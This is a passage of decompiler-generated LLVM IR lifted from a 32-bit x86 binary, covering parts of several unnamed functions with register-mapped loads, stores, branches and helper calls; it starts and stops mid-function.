  %v0_804cafe.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804caf3

dec_label_pc_804caed:                             ; preds = %dec_label_pc_804ca9d
  %v1_804caed = add i32 %v0_804caed, 1
  store i32 %v1_804caed, i32* @ecx, align 4
  %v1_804caee = inttoptr i32 %v1_804caed to i8*
  %v2_804caee = load i8, i8* %v1_804caee, align 1
  %v3_804caee = icmp eq i8 %v2_804caee, 0
  %v1_804caf1 = icmp eq i1 %v3_804caee, false
  br i1 %v1_804caf1, label %dec_label_pc_804ca9d, label %dec_label_pc_804caf3

dec_label_pc_804caf3:                             ; preds = %dec_label_pc_804caed, %dec_label_pc_804cacb
  %v0_804cafe = phi i32 [ %v0_804cafe.pre, %dec_label_pc_804cacb ], [ %storemerge4, %dec_label_pc_804caed ]
  %v0_804cafb = phi i32 [ %v0_804cafb.pre, %dec_label_pc_804cacb ], [ %v0_804ca87, %dec_label_pc_804caed ]
  %v0_804caf3 = phi i32 [ %v2_804cae9, %dec_label_pc_804cacb ], [ %v3_804ca94, %dec_label_pc_804caed ]
  store i32 %v0_804caf3, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804cafb = inttoptr i32 %v0_804cafb to i8*
  %v2_804cafb = load i8, i8* %v1_804cafb, align 1
  %v3_804cafb = sext i8 %v2_804cafb to i32
  store i32 %v3_804cafb, i32* %eax.global-to-local, align 4
  %v2_804cafe = add i32 %tmp76, 4
  %v3_804cafe = inttoptr i32 %v2_804cafe to i32*
  store i32 %v0_804cafe, i32* %v3_804cafe, align 4
  %v0_804cb01 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb01 = load i32, i32* @edx, align 4
  %v2_804cb01 = add i32 %v1_804cb01, 12
  %v3_804cb01 = inttoptr i32 %v2_804cb01 to i32*
  store i32 %v0_804cb01, i32* %v3_804cb01, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804cb08 = load i32, i32* @edx, align 4
  %v1_804cb08 = add i32 %v0_804cb08, 28
  %v2_804cb08 = inttoptr i32 %v1_804cb08 to i32*
  store i32 1, i32* %v2_804cb08, align 4
  %v0_804cb0f = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb0f = load i32, i32* @edx, align 4
  %v2_804cb0f = add i32 %v1_804cb0f, 8
  %v3_804cb0f = inttoptr i32 %v2_804cb0f to i32*
  store i32 %v0_804cb0f, i32* %v3_804cb0f, align 4
  %v0_804cb12 = load i32, i32* %edi.global-to-local, align 4
  %v1_804cb1c = and i32 %v0_804cb12, -5
  %v0_804cb22 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cb22 = and i32 %v0_804cb22, 3840
  store i32 %v1_804cb22, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804cb2b = or i32 %v1_804cb22, %v1_804cb1c
  store i32 %v2_804cb2b, i32* @edi, align 4
  %v1_804cb2d = load i32, i32* @edx, align 4
  %v2_804cb2d = add i32 %v1_804cb2d, 20
  %v3_804cb2d = inttoptr i32 %v2_804cb2d to i32*
  store i32 48, i32* %v3_804cb2d, align 4
  %v0_804cb30 = load i32, i32* @edi, align 4
  %v1_804cb30 = load i32, i32* @edx, align 4
  %v2_804cb30 = add i32 %v1_804cb30, 16
  %v3_804cb30 = inttoptr i32 %v2_804cb30 to i32*
  store i32 %v0_804cb30, i32* %v3_804cb30, align 4
  %v0_804cb33 = load i32, i32* @ecx, align 4
  %v1_804cb33 = inttoptr i32 %v0_804cb33 to i8*
  %v2_804cb33 = load i8, i8* %v1_804cb33, align 1
  %v3_804cb33 = icmp eq i8 %v2_804cb33, 0
  %v1_804cb36 = icmp eq i1 %v3_804cb33, false
  br i1 %v1_804cb36, label %dec_label_pc_804cb4f, label %dec_label_pc_804cb38

dec_label_pc_804cb38:                             ; preds = %dec_label_pc_804caf3
  %v0_804cb38 = load i32, i32* @esi, align 4
  %v1_804cb38 = inttoptr i32 %v0_804cb38 to i8*
  %v2_804cb38 = load i8, i8* %v1_804cb38, align 1
  %v11_804cb38 = icmp eq i8 %v2_804cb38, 109
  %v1_804cb3b = icmp eq i1 %v11_804cb38, false
  br i1 %v1_804cb3b, label %dec_label_pc_804cc49, label %dec_label_pc_804cb41

dec_label_pc_804cb41:                             ; preds = %dec_label_pc_804cb38
  %v0_804cb41 = load i32, i32* @edx, align 4
  %v1_804cb41 = add i32 %v0_804cb41, 32
  %v2_804cb41 = inttoptr i32 %v1_804cb41 to i32*
  store i32 20, i32* %v2_804cb41, align 4
  %v0_804cb48 = load i32, i32* @edx, align 4
  %v1_804cb48 = add i32 %v0_804cb48, 28
  %v2_804cb48 = inttoptr i32 %v1_804cb48 to i32*
  store i32 0, i32* %v2_804cb48, align 4
  br label %dec_label_pc_804cb4f

dec_label_pc_804cb4f:                             ; preds = %dec_label_pc_804caf3, %dec_label_pc_804cb41
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804cbeb, label %dec_label_pc_804cb5a

dec_label_pc_804cb5a:                             ; preds = %dec_label_pc_804cb4f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804cbd3 = add i32 %tmp76, 40
  %v4_804cb69 = add i32 %tmp76, 36
  %v1_804cbdc = add i32 %tmp76, 28
  %v2_804cbdc = inttoptr i32 %v1_804cbdc to i32*
  br label %dec_label_pc_804cb5c

dec_label_pc_804cb5c:                             ; preds = %dec_label_pc_804cbd7, %dec_label_pc_804cb5a
  %v0_804cb72 = phi i32 [ 0, %dec_label_pc_804cb5a ], [ %v1_804cbdb, %dec_label_pc_804cbd7 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804cb5a ], [ %stack_var_-88.5, %dec_label_pc_804cbd7 ]
  %v1_804cb5c = add i32 %v0_804cb72, -2
  %v6_804cb5c = sub i32 1, %v0_804cb72
  %v7_804cb5c = and i32 %v6_804cb5c, %v0_804cb72
  %v8_804cb5c = icmp slt i32 %v7_804cb5c, 0
  %v9_804cb5c = icmp eq i32 %v1_804cb5c, 0
  %v10_804cb5c = icmp slt i32 %v1_804cb5c, 0
  %v3_804cb5f = icmp eq i1 %v10_804cb5c, %v8_804cb5c
  %v4_804cb5f = icmp eq i1 %v9_804cb5c, false
  %v5_804cb5f = and i1 %v4_804cb5f, %v3_804cb5f
  br i1 %v5_804cb5f, label %dec_label_pc_804cb72, label %dec_label_pc_804cb61

dec_label_pc_804cb61:                             ; preds = %dec_label_pc_804cb5c
  %v0_804cb61 = load i32, i32* @esp, align 4
  %v2_804cb61 = mul i32 %v0_804cb72, 4
  %v3_804cb61 = add i32 %v2_804cb61, 68
  %v4_804cb61 = add i32 %v3_804cb61, %v0_804cb61
  %v5_804cb61 = inttoptr i32 %v4_804cb61 to i32*
  %v6_804cb61 = load i32, i32* %v5_804cb61, align 4
  store i32 %v6_804cb61, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804cb69 = trunc i32 %v6_804cb61 to i8
  %v5_804cb69 = add i32 %v4_804cb69, %v0_804cb72
  %v6_804cb69 = inttoptr i32 %v5_804cb69 to i8*
  store i8 %v1_804cb69, i8* %v6_804cb69, align 1
  %v0_804cb6d = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb6d = urem i32 %v0_804cb6d, 256
  br label %dec_label_pc_804cb7b

dec_label_pc_804cb72:                             ; preds = %dec_label_pc_804cb5c
  %v5_804cb74 = add i32 %v0_804cb72, %stack_var_-32.3
  store i32 %v5_804cb74, i32* %eax.global-to-local, align 4
  %v1_804cb78 = add i32 %v5_804cb74, -2
  br label %dec_label_pc_804cb7b

dec_label_pc_804cb7b:                             ; preds = %dec_label_pc_804cb61, %dec_label_pc_804cb72
  %v0_804cb8e = phi i32 [ %v1_804cb6d, %dec_label_pc_804cb61 ], [ %v1_804cb78, %dec_label_pc_804cb72 ]
  store i32 %v0_804cb8e, i32* %eax.global-to-local, align 4
  %v5_804cb7b = sub i32 %v0_804cb8e, %stack_var_-88.4
  %v11_804cb7b = xor i32 %v0_804cb8e, %stack_var_-88.4
  %v12_804cb7b = xor i32 %v5_804cb7b, %v0_804cb8e
  %v13_804cb7b = and i32 %v12_804cb7b, %v11_804cb7b
  %v14_804cb7b = icmp slt i32 %v13_804cb7b, 0
  %v15_804cb7b = icmp eq i32 %v5_804cb7b, 0
  %v16_804cb7b = icmp slt i32 %v5_804cb7b, 0
  %v3_804cb7f = icmp ne i1 %v16_804cb7b, %v14_804cb7b
  %v4_804cb7f = or i1 %v15_804cb7b, %v3_804cb7f
  br i1 %v4_804cb7f, label %dec_label_pc_804cb8e, label %dec_label_pc_804cb81

dec_label_pc_804cb81:                             ; preds = %dec_label_pc_804cb7b
  %v1_804cb81 = add i32 %v0_804cb8e, -9
  %v6_804cb81 = sub i32 8, %v0_804cb8e
  %v7_804cb81 = and i32 %v6_804cb81, %v0_804cb8e
  %v8_804cb81 = icmp slt i32 %v7_804cb81, 0
  %v9_804cb81 = icmp eq i32 %v1_804cb81, 0
  %v10_804cb81 = icmp slt i32 %v1_804cb81, 0
  %v3_804cb84 = icmp eq i1 %v10_804cb81, %v8_804cb81
  %v4_804cb84 = icmp eq i1 %v9_804cb81, false
  %v5_804cb84 = and i1 %v4_804cb84, %v3_804cb84
  br i1 %v5_804cb84, label %dec_label_pc_804cc49, label %dec_label_pc_804cb8e

dec_label_pc_804cb8e:                             ; preds = %dec_label_pc_804cb81, %dec_label_pc_804cb7b
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804cb7b ], [ %v0_804cb8e, %dec_label_pc_804cb81 ]
  %v1_804cb8e = add i32 %v0_804cb8e, -1
  store i32 %v1_804cb8e, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804cb97 = load i32, i32* @esp, align 4
  %v1_804cb97 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804cb97 = mul i32 %v1_804cb97, 4
  %v3_804cb97 = add i32 %v0_804cb97, 80
  %v4_804cb97 = add i32 %v3_804cb97, %v2_804cb97
  %v5_804cb97 = inttoptr i32 %v4_804cb97 to i32*
  %v6_804cb97 = load i32, i32* %v5_804cb97, align 4
  store i32 %v6_804cb97, i32* %edi.global-to-local, align 4
  %v2_804cb9b = mul i32 %v1_804cb8e, 4
  %v4_804cb9b = add i32 %v4_804cbd3, %v2_804cb9b
  %v5_804cb9b = inttoptr i32 %v4_804cb9b to i32*
  %v6_804cb9b = load i32, i32* %v5_804cb9b, align 4
  store i32 %v6_804cb9b, i32* @eax, align 4
  %v9_804cb9f = icmp eq i32 %v6_804cb97, 8
  br i1 %v9_804cb9f, label %dec_label_pc_804cbd7, label %dec_label_pc_804cba4

dec_label_pc_804cba4:                             ; preds = %dec_label_pc_804cb8e
  %v9_804cba4 = icmp eq i32 %v6_804cb9b, 8
  br i1 %v9_804cba4, label %dec_label_pc_804cbc7, label %dec_label_pc_804cba9

dec_label_pc_804cba9:                             ; preds = %dec_label_pc_804cba4
  %v12_804cba9 = icmp eq i32 %v6_804cb9b, %v6_804cb97
  br i1 %v12_804cba9, label %dec_label_pc_804cbc7, label %dec_label_pc_804cbad

dec_label_pc_804cbad:                             ; preds = %dec_label_pc_804cba9
  %v1_804cbad = call i32 @function_804c85c(i32 %v1_804cb8e)
  store i32 %v1_804cbad, i32* %ebx.global-to-local, align 4
  %v0_804cbb4 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804cbb4, i32* @eax, align 4
  %v1_804cbb6 = call i32 @function_804c85c(i32 %v1_804cb8e)
  %v2_804cbbb = sub i32 %v1_804cbad, %v1_804cbb6
  %v8_804cbbb = xor i32 %v1_804cbad, %v1_804cbb6
  %v9_804cbbb = xor i32 %v2_804cbbb, %v1_804cbad
  %v10_804cbbb = and i32 %v9_804cbbb, %v8_804cbbb
  %v11_804cbbb = icmp slt i32 %v10_804cbbb, 0
  %v12_804cbbb = icmp eq i32 %v2_804cbbb, 0
  %v13_804cbbb = icmp slt i32 %v2_804cbbb, 0
  %v3_804cbbd = icmp ne i1 %v13_804cbbb, %v11_804cbbb
  %v4_804cbbd = or i1 %v12_804cbbb, %v3_804cbbd
  %v5_804cbbd = zext i1 %v4_804cbbd to i32
  store i32 %v5_804cbbd, i32* %eax.global-to-local, align 4
  %v1_804cbc3 = icmp eq i1 %v4_804cbbd, false
  br i1 %v1_804cbc3, label %dec_label_pc_804cbd7, label %dec_label_pc_804cbad.dec_label_pc_804cbc7_crit_edge

dec_label_pc_804cbad.dec_label_pc_804cbc7_crit_edge: ; preds = %dec_label_pc_804cbad
  %v0_804cbc7.pre = load i32, i32* @esp, align 4
  %v1_804cbc7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804cbc7

dec_label_pc_804cbc7:                             ; preds = %dec_label_pc_804cbad.dec_label_pc_804cbc7_crit_edge, %dec_label_pc_804cba9, %dec_label_pc_804cba4
  %v1_804cbc7 = phi i32 [ %v1_804cbc7.pre, %dec_label_pc_804cbad.dec_label_pc_804cbc7_crit_edge ], [ %v1_804cb97, %dec_label_pc_804cba9 ], [ %v1_804cb97, %dec_label_pc_804cba4 ]
  %v0_804cbc7 = phi i32 [ %v0_804cbc7.pre, %dec_label_pc_804cbad.dec_label_pc_804cbc7_crit_edge ], [ %v0_804cb97, %dec_label_pc_804cba9 ], [ %v0_804cb97, %dec_label_pc_804cba4 ]
  %v2_804cbc7 = mul i32 %v1_804cbc7, 4
  %v3_804cbc7 = add i32 %v0_804cbc7, 80
  %v4_804cbc7 = add i32 %v3_804cbc7, %v2_804cbc7
  %v5_804cbc7 = inttoptr i32 %v4_804cbc7 to i32*
  %v6_804cbc7 = load i32, i32* %v5_804cbc7, align 4
  store i32 %v6_804cbc7, i32* %eax.global-to-local, align 4
  store i32 %v1_804cb8e, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804cbc7, i32* %v5_804cb9b, align 4
  br label %dec_label_pc_804cbd7

dec_label_pc_804cbd7:                             ; preds = %dec_label_pc_804cbad, %dec_label_pc_804cb8e, %dec_label_pc_804cbc7
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804cbdb = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cbdb = add i32 %v0_804cbdb, 1
  store i32 %v1_804cbdb, i32* %ebp.global-to-local, align 4
  %v3_804cbdc = load i32, i32* %v2_804cbdc, align 4
  %v1_804cbdf = add i32 %v3_804cbdc, 2
  store i32 %v1_804cbdf, i32* %eax.global-to-local, align 4
  %v5_804cbe4 = icmp slt i32 %v1_804cbdb, %v1_804cbdf
  br i1 %v5_804cbe4, label %dec_label_pc_804cb5c, label %dec_label_pc_804cc12

dec_label_pc_804cbeb:                             ; preds = %dec_label_pc_804cb4f
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804cbef = add i32 %tmp76, 38
  %v2_804cbef = inttoptr i32 %v1_804cbef to i8*
  store i8 1, i8* %v2_804cbef, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804cbf8 = add i32 %tmp76, 28
  %v2_804cbf8 = inttoptr i32 %v1_804cbf8 to i32*
  %v3_804cbf8 = load i32, i32* %v2_804cbf8, align 4
  %v2_804cbfb = mul i32 %v3_804cbf8, 4
  %v2_804cbff = ptrtoint i32* %stack_var_-20 to i32
  %v1_804cc06 = add i32 %tmp76, 40
  store i32 %v1_804cc06, i32* %eax.global-to-local, align 4
  %v3_804cc0a = inttoptr i32 %v1_804cc06 to i16*
  %v4_804cc0a = call i32 @function_804d1a8(i16* %v3_804cc0a, i32 %v2_804cbff, i32 %v2_804cbfb)
  store i32 %v4_804cc0a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc12

dec_label_pc_804cc12:                             ; preds = %dec_label_pc_804cbd7, %dec_label_pc_804cbeb
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804cbeb ], [ %stack_var_-88.5, %dec_label_pc_804cbd7 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804cc1a = inttoptr i32 %v1_804c8bb to i8*
  %v3_804cc1a = load i8, i8* %v2_804cc1a, align 1
  %v5_804cc1a = icmp slt i8 %v3_804cc1a, 0
  store i32 %stack_var_-88.6, i32* %v2_804c8b4, align 4
  br i1 %v5_804cc1a, label %dec_label_pc_804cc2a, label %dec_label_pc_804cc23

dec_label_pc_804cc23:                             ; preds = %dec_label_pc_804cc12
  %v0_804cc23 = load i32, i32* @esi, align 4
  %v1_804cc23 = add i32 %v0_804cc23, 1
  store i32 %v1_804cc23, i32* %eax.global-to-local, align 4
  %v1_804cc26 = load i32, i32* @ecx, align 4
  %v2_804cc26 = inttoptr i32 %v1_804cc26 to i32*
  store i32 %v1_804cc23, i32* %v2_804cc26, align 4
  br label %dec_label_pc_804cc3d

dec_label_pc_804cc2a:                             ; preds = %dec_label_pc_804cc12
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804c888, i32* %edx.global-to-local, align 4
  %v0_804cc32 = load i32, i32* @esi, align 4
  %v2_804cc32 = sub i32 %v0_804cc32, %v4_804c888
  store i32 %v2_804cc32, i32* %esi.global-to-local, align 4
  %v1_804cc34 = mul i32 %v2_804cc32, 4
  %v2_804cc34 = add i32 %v1_804cc34, 224
  store i32 %v2_804cc34, i32* %eax.global-to-local, align 4
  %v2_804cc3b = load i32, i32* %arg1, align 4
  %v4_804cc3b = add i32 %v2_804cc3b, %v2_804cc34
  store i32 %v4_804cc3b, i32* %arg1, align 4
  br label %dec_label_pc_804cc3d

dec_label_pc_804cc3d:                             ; preds = %dec_label_pc_804cc23, %dec_label_pc_804cc2a
  store i32 %tmp76, i32* @edx, align 4
  %v1_804cc41 = add i32 %tmp76, 28
  %v2_804cc41 = inttoptr i32 %v1_804cc41 to i32*
  %v3_804cc41 = load i32, i32* %v2_804cc41, align 4
  store i32 %v3_804cc41, i32* %eax.global-to-local, align 4
  %v1_804cc44 = add i32 %v3_804cc41, 2
  br label %dec_label_pc_804cc4c

dec_label_pc_804cc49:                             ; preds = %dec_label_pc_804c8d9, %dec_label_pc_804c973, %dec_label_pc_804c9a6, %dec_label_pc_804ca21, %dec_label_pc_804ca0d, %dec_label_pc_804ca04, %dec_label_pc_804cb81, %dec_label_pc_804cb38, %dec_label_pc_804ca83
  br label %dec_label_pc_804cc4c

dec_label_pc_804cc4c:                             ; preds = %dec_label_pc_804cc3d, %dec_label_pc_804cc49
  %storemerge6 = phi i32 [ %v1_804cc44, %dec_label_pc_804cc3d ], [ -1, %dec_label_pc_804cc49 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804cc4f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cc4f, i32* @ebx, align 4
  store i32 %v0_804c887, i32* @esi, align 4
  store i32 %v0_804c886, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804cbdb, { 0, 2, 1 }
  uselistorder i32 %v2_804cbbb, { 1, 2, 0 }
  uselistorder i32 %v1_804cbad, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804cb8e, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804cb81, { 1, 0 }
  uselistorder i32 %v5_804cb7b, { 1, 2, 0 }
  uselistorder i32 %v0_804cb8e, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804cb5c, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804cb72, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804caed, { 1, 2, 0 }
  uselistorder i32 %v1_804cac3, { 1, 2, 0 }
  uselistorder i32 %v0_804caed, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804ca89, { 1, 0 }
  uselistorder i32 %v1_804ca76, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804ca7f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804ca69, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804ca5f, { 1, 0 }
  uselistorder i32 %v1_804ca41, { 1, 0 }
  uselistorder i32 %v0_804ca5f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804ca24, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804ca1b, { 1, 2, 0 }
  uselistorder i32 %v0_804c9e1, { 1, 0 }
  uselistorder i32 %v1_804c9d3, { 1, 0 }
  uselistorder i32 %v1_804c9ce, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804c9cc, { 2, 0, 1 }
  uselistorder i32 %v0_804c9ee, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804c989, { 1, 2, 0 }
  uselistorder i32 %v0_804c961, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804c957, { 1, 2, 0 }
  uselistorder i32 %v6_804c955, { 0, 2, 1 }
  uselistorder i32 %v0_804c954, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804c94d, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804c94d, { 2, 1, 0 }
  uselistorder i32 %v1_804c945, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804c92b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804c901, { 0, 2, 1 }
  uselistorder i32 %v0_804c8ee, { 2, 0, 1 }
  uselistorder i32 %v4_804c888, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @function_804c85c, { 1, 0 }
  uselistorder i32 -9, { 2, 0, 3, 1 }
  uselistorder i32 -5, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -134558775, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8053441.128 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804cc4c, { 1, 0 }
  uselistorder label %dec_label_pc_804cc49, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804cc3d, { 1, 0 }
  uselistorder label %dec_label_pc_804cc12, { 1, 0 }
  uselistorder label %dec_label_pc_804cbd7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cb7b, { 1, 0 }
  uselistorder label %dec_label_pc_804cb4f, { 1, 0 }
  uselistorder label %dec_label_pc_804cab7, { 1, 0 }
  uselistorder label %dec_label_pc_804ca83, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ca5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ca31, { 1, 0 }
  uselistorder label %dec_label_pc_804c9f8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804c99b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c955, { 1, 0 }
  uselistorder label %dec_label_pc_804c954, { 1, 0 }
  uselistorder label %dec_label_pc_804c93b, { 1, 0 }
  uselistorder label %dec_label_pc_804c924, { 1, 0 }
  uselistorder label %dec_label_pc_804c924.outer, { 2, 0, 1 }
}

define i32 @function_804cc54(i16* %arg1) local_unnamed_addr {
dec_label_pc_804cc54:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_804cc57 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804cc5a = ptrtoint i16* %arg1 to i32
  store i32 %v4_804cc5a, i32* %esi.global-to-local, align 4
  %v1_804cc5e = add i32 %v4_804cc5a, 52
  %v2_804cc5e = inttoptr i32 %v1_804cc5e to i32*
  %v3_804cc5e = load i32, i32* %v2_804cc5e, align 4
  %v1_804cc61 = icmp eq i32 %v3_804cc5e, 0
  %v1_804cc63 = icmp eq i1 %v1_804cc61, false
  br i1 %v1_804cc63, label %dec_label_pc_804cc84, label %dec_label_pc_804cc65

dec_label_pc_804cc65:                             ; preds = %dec_label_pc_804cc54
  %v1_804cc65 = add i32 %v4_804cc5a, 56
  store i32 %v1_804cc65, i32* %ebx.global-to-local, align 4
  store i32 %v12_804cc57, i32* @eax, align 4
  %v2_804cc74 = call i32 @function_804f016(i32 %v12_804cc57, i32 134541331)
  %v1_804cc7c = call i32 @function_804f013(i32 %v1_804cc65)
  %v0_804cc86.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804cc84

dec_label_pc_804cc84:                             ; preds = %dec_label_pc_804cc54, %dec_label_pc_804cc65
  %v0_804cc86 = phi i32 [ %v4_804cc5a, %dec_label_pc_804cc54 ], [ %v0_804cc86.pre, %dec_label_pc_804cc65 ]
  %v1_804cc86 = inttoptr i32 %v0_804cc86 to i16*
  %v2_804cc86 = load i16, i16* %v1_804cc86, align 2
  %v3_804cc86 = zext i16 %v2_804cc86 to i32
  store i32 %v3_804cc86, i32* %ebx.global-to-local, align 4
  br i1 %v1_804cc63, label %dec_label_pc_804cc9c, label %dec_label_pc_804cc8b

dec_label_pc_804cc8b:                             ; preds = %dec_label_pc_804cc84
  store i32 %v12_804cc57, i32* @eax, align 4
  %v2_804cc94 = call i32 @function_804f016(i32 %v12_804cc57, i32 1)
  %v0_804cc9f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cc9c

dec_label_pc_804cc9c:                             ; preds = %dec_label_pc_804cc84, %dec_label_pc_804cc8b
  %v0_804cc9f = phi i32 [ %v3_804cc86, %dec_label_pc_804cc84 ], [ %v0_804cc9f.pre, %dec_label_pc_804cc8b ]
  %v1_804cc9f = and i32 %v0_804cc9f, 4
  ret i32 %v1_804cc9f

; uselistorder directives
  uselistorder i32 %v12_804cc57, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804cc9c, { 1, 0 }
  uselistorder label %dec_label_pc_804cc84, { 1, 0 }
}

define i32 @function_804cca8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804cca8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cca8 = load i32, i32* @edi, align 4
  %v0_804cca9 = load i32, i32* @esi, align 4
  %v0_804ccaa = load i32, i32* @ebx, align 4
  %v12_804ccab = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804ccb2 = add i32 %arg3, 52
  %v2_804ccb2 = inttoptr i32 %v1_804ccb2 to i32*
  %v3_804ccb2 = load i32, i32* %v2_804ccb2, align 4
  store i32 %v3_804ccb2, i32* @edi, align 4
  %v1_804ccb5 = icmp eq i32 %v3_804ccb2, 0
  %v1_804ccb7 = icmp eq i1 %v1_804ccb5, false
  br i1 %v1_804ccb7, label %dec_label_pc_804cca8.dec_label_pc_804ccd8_crit_edge, label %dec_label_pc_804ccb9

dec_label_pc_804cca8.dec_label_pc_804ccd8_crit_edge: ; preds = %dec_label_pc_804cca8
  br label %dec_label_pc_804ccd8

dec_label_pc_804ccb9:                             ; preds = %dec_label_pc_804cca8
  %v1_804ccb9 = add i32 %arg3, 56
  store i32 %v1_804ccb9, i32* @ebx, align 4
  store i32 %v12_804ccab, i32* @eax, align 4
  %v2_804ccc8 = call i32 @function_804f016(i32 %v12_804ccab, i32 134541331)
  %v0_804cccd = load i32, i32* @ebx, align 4
  %v1_804ccd0 = call i32 @function_804f013(i32 %v0_804cccd)
  %v0_804ccd9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ccd8

dec_label_pc_804ccd8:                             ; preds = %dec_label_pc_804cca8.dec_label_pc_804ccd8_crit_edge, %dec_label_pc_804ccb9
  %v0_804ccd9 = phi i32 [ %arg3, %dec_label_pc_804cca8.dec_label_pc_804ccd8_crit_edge ], [ %v0_804ccd9.pre, %dec_label_pc_804ccb9 ]
  %v0_804ccd8 = load i32, i32* @edx, align 4
  %v4_804cce2 = inttoptr i32 %arg1 to i8*
  %v5_804cce2 = call i32 @function_804cfd4(i8* %v4_804cce2, i32 %arg2, i32 %v0_804ccd9, i32 %v0_804ccd8)
  store i32 %v5_804cce2, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ccb7, label %dec_label_pc_804cd01, label %dec_label_pc_804ccf0

dec_label_pc_804ccf0:                             ; preds = %dec_label_pc_804ccd8
  store i32 %v12_804ccab, i32* @eax, align 4
  %v2_804ccf9 = call i32 @function_804f016(i32 %v12_804ccab, i32 1)
  %v0_804cd04.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cd01

